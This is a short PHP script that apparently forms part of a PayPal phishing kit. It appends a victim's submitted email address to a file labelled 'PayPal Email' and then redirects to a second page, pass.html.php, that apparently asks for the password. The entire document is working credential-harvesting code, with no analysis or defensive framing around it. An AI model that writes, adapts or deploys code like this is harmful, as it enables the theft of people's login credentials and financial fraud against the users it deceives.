<?php
file_put_contents("usernames.txt", "PayPal Email: " . $_POST['login_email'] . "\n", FILE_APPEND);
header('Location: pass.html.php');
exit();
?>